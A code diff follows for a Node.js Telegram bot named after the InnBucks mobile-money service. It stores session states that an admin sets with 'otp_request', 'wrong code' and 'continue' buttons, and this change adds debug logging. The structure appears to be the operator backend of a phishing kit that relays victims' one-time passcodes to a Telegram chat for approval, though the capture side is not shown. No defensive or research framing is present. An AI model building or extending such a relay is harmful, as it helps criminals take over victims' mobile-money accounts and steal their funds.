@@ -1,7 +1,7 @@
 const fetch = require('node-fetch');
 const crypto = require('crypto');
 
-// Store sessions in memory instead of files (Render filesystem is read-only)
+// Global session store - shared across all requests
 const sessions = {};
 
 class InnBucksBot {
@@ -9,7 +9,6 @@ class InnBucksBot {
     this.botToken = token;
     this.adminChatId = adminId;
     this.apiUrl = `https://api.telegram.org/bot${this.botToken}/`;
-    this.lastUpdateId = 0;
   }
 
   async sendRequest(method, data = {}) {
@@ -58,8 +57,9 @@ class InnBucksBot {
       reply_markup: JSON.stringify(keyboard)
     });
 
-    // Store session in memory
     sessions[sessionId] = 'pending';
+    console.log(`✅ Session created: ${sessionId}`);
+    console.log(`📦 All sessions:`, sessions);
 
     return { success: true, sessionId };
   }
@@ -92,29 +92,33 @@ class InnBucksBot {
     const data = callbackQuery.data;
     const callbackId = callbackQuery.id;
 
+    console.log(`🔔 Callback received: ${data}`);
+
     if (data.startsWith('otp_request_')) {
       const sessionId = data.replace('otp_request_', '');
       sessions[sessionId] = 'approved';
-      await this.sendRequest('answerCallbackQuery', { callback_query_id: callbackId });
-
+      console.log(`✅ Session approved: ${sessionId}`);
     } else if (data.startsWith('wrong_')) {
       const sessionId = data.replace('wrong_', '');
       sessions[sessionId] = 'wrong_code';
-      await this.sendRequest('answerCallbackQuery', { callback_query_id: callbackId });
-
+      console.log(`❌ Session wrong_code: ${sessionId}`);
     } else if (data.startsWith('continue_')) {
       const sessionId = data.replace('continue_', '');
       sessions[sessionId] = 'continue';
-      await this.sendRequest('answerCallbackQuery', { callback_query_id: callbackId });
+      console.log(`➡️ Session continue: ${sessionId}`);
     }
 
+    console.log(`📦 All sessions after callback:`, sessions);
+
+    await this.sendRequest('answerCallbackQuery', { callback_query_id: callbackId });
     return true;
   }
 
   getSessionStatus(sessionId) {
     const status = sessions[sessionId] || 'pending';
+    console.log(`🔍 Checking session ${sessionId}: ${status}`);
     if (status !== 'pending') {
-      delete sessions[sessionId]; // clean up after reading
+      delete sessions[sessionId];
     }
     return status;
   }
